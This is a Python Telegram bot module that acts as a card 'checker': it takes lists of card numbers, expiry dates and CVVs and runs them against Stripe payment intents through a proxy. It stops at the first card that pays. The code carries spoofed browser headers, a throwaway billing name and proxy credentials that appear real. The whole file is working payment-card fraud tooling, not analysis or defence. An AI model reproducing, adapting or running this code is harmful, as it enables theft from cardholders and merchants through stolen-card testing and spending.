from pyrogram import Client, filters
from pyrogram.types import Message
import requests
from EQUROBOT import app

AUTH = list(map(int, "7427691214 7091230649 6271170584").split())


combined_proxy = "prox-lu.pointtoserver.com:10799:purevpn0s3978104:hk6vchvcmyah"
components = combined_proxy.split(':')
username = components[2]
password = components[3]
proxy = components[0]
proxy_port = components[1]
proxy_auth = f"{username}:{password}@{proxy}:{proxy_port}"
proxies = {
    "http": f"http://{proxy_auth}",
    "https": f"http://{proxy_auth}"
}

def pistuff(cc, mes, ano, cvv, pk, secretpi, proxies):
    session = requests.Session()
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "/"
    }

    response = session.post("https://m.stripe.com/6", headers=headers, proxies=proxies)
    json_data = response.json()
    m = json_data.get("muid")
    s = json_data.get("sid")
    g = json_data.get("guid")

    index = secretpi.find('_secret_')
    if index != -1:
        pi = secretpi[:index]
    else:
        return "Secret key not found in response."

    data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=skibidi+sigma+csub&payment_method_data[card][number]={cc}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]={g}&payment_method_data[muid]={m}&payment_method_data[sid]={s}&payment_method_data[pasted_fields]=number&payment_method_data[referrer]=https%3A%2F%2Froblox.com&expected_payment_method_type=card&use_stripe_sdk=true&key={pk}&client_secret={secretpi}'
    response = session.post(f'https://api.stripe.com/v1/payment_intents/{pi}/confirm', headers=headers, data=data, proxies=proxies)

    response_json = response.json()
    code = response_json.get("error", {}).get("code")
    decline_code = response_json.get("error", {}).get("decline_code")
    message = response_json.get("error", {}).get("message")

    if '"status": "succeeded"' in response.text:
        return (f"\n✫PI Checkouter✫\n➥ 💳 𝐂𝐂 -» {cc}|{mes}|{ano}|{cvv}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Payment successful", True)
    elif "requires_source_action" in response.text or "intent_confirmation_challenge" in response.text or "requires_action" in response.text:
        return (f"\n✫PI Checkouter✫\n➥ 💳 𝐂𝐂 -» {cc}|{mes}|{ano}|{cvv}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Declined\n➥ 🔥 𝐒𝐭𝐚𝐭𝐮𝐬 -» 3DS CARD", False)
    else:
        return (f"\n✫PI Checkouter✫\n➥ 💳 𝐂𝐂 -» {cc}|{mes}|{ano}|{cvv}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Declined\n➥ 🔥 𝐒𝐭𝐚𝐭𝐮𝐬 -» {code} | {decline_code} | {message}", False)

@app.on_message(filters.command("hit") & filters.user(AUTH))
async def handle_cc(client, message):
    user_id = message.from_user.id
    input = await app.ask(message.chat.id, "**SEND CC**", reply_to_message_id=message.id, user_id=user_id)
    if input.document:
        x = await input.download()
        await input.delete(True)
        with open(x, "r") as f:
            content = f.read()
        content = content.split("\n")
    else:
        content = input.text
        content = content.split("\n")
        await input.delete(True)

    input2 = await app.ask(message.chat.id, "**SEND PK**", reply_to_message_id=message.id, user_id=user_id)
    pk = input2.text
    await input2.delete(True)

    input3 = await app.ask(message.chat.id, "**SEND CS**", reply_to_message_id=message.id, user_id=user_id)
    cs = input3.text
    await input3.delete(True)

    for i in content:
        cc, mes, ano, cvv = i.strip().split("|")
        result, success = pistuff(cc, mes, ano, cvv, pk, cs, proxies=proxies)
        await message.reply_text(result)
        if success:
            break
